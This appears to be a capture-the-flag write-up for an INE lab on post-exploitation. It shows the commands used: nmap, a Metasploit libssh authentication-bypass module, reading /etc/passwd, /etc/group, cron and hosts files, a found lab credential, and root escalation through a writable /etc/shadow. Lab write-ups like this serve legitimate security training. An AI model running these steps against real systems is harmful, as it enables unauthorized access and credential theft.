## Host & Network Penetration Testing: Post-Exploitation CTF 1

### Flag 1: The file that stores user account details is worth a closer look. (target1.ine.local)

We begin with an Nmap scan which identifies only one open port running a vulnerable service.
```
nmap -sS -T4 target1.ine.local -p-
nmap -sS -T4 -sV -p22 target2.ine.local
searchploit libssh
```
We found two Python exploits, but maybe there is a Metasploit module easier to deploy.
```
use auxiliary/scanner/ssh/libssh_auth_bypass
set action Shell
set SPAWN_PTY true
set RHOSTS target1.ine.local
run
```
After execution, we can use the spawned session.
```
cat /etc/passwd
```
To find the first flag.


### Flag 2: User groups might reveal more than you expect.
```
cat /etc/group
```
To find the second flag.


### Flag 3: Scheduled tasks often have telling names. Investigate the cron jobs to uncover the secret.
```
ls -la /etc/cron.d
```
To find the third flag.


### Flag 4: DNS configurations might point you in the right direction. Also, explore the home directories for stored credentials.
```
cat /etc/hosts
```
To find the fourth flag.

In the home directory, we can find Johnâ€™s credentials.
```
john:Pass@john123
```

### Flag 5: Use the discovered credentials to gain higher privileges and explore the root's home directory on target2.ine.local.

We try to connect via SSH to target2.ine.local with John's credentials.
```
ssh john@target2.ine.local
```
John, though not a root user, has read and write permissions to the /etc/shadow file.

We can assign the same password to the root user and gain access to the root folder.
```
su root
cd root
cat flag.txt
```
The way we obtained the last flag.


